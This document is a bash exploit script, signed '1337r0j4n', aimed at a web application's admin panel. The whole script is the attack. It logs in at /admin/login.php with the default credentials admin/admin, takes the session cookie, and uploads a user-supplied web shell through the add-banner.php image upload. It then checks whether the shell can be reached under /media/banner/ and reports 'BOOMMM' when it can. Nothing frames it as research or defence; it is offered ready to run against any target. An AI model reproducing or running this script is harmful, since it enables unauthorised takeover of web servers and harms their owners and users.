#!/bin/bash

RED="$(printf '\033[1;31m')"  GREEN="$(printf '\033[1;32m')" PURPLE="$(printf '\033[1;35m')" RESAT="$(printf '\033[0m')"
cat << EOF
${PURPLE}    ___   ___   _ ${RED}  _    ${GREEN}  _     _     _
${PURPLE}   | |_) | |_) / |${RED} \ \  /${GREEN} | | | | |   | |\ |
${PURPLE}   |_|   |_| \ |_|${RED}  \_\/ ${GREEN} \_\_/ |_|__ |_| \|  ${RESAT}1337r0j4n

EOF

read -p " TARGET: " target
read -p " SHELLL: " shell

if [[ -f $shell ]]; then

    $(curl -s -k -X POST -d "username=admin&password=admin&submit=" $target/admin/login.php -D .response_header.txt -o /dev/null)
    get_cookie=$(cat .response_header.txt | grep "Set-Cookie:" | cut -d " " -f 2 | cut -d ";" -f 1)

    $(curl -s --cookie "$get_cookie" -F "orderno=1337" -F "productimage1=@$shell" -F "addb=" $target/admin/add-banner.php -o /dev/null)
    get_shell=$(curl -s -o /dev/null --max-time 10 -w "%{http_code}" "$target/media/banner/$shell")
        if [[ $get_shell == "200" ]]; then
            echo -e " BOOMMM: ${GREEN}$target/media/banner/$shell${RESAT}"
        else
            echo -e " The target that u enter ${RED}wasn't vuln${RESAT} BRO"
        fi

else
   echo " The shell name that u enter called ${RED}$shell wasn't found${RESAT}, Bro"
fi

# clean log
rm .response_header.txt
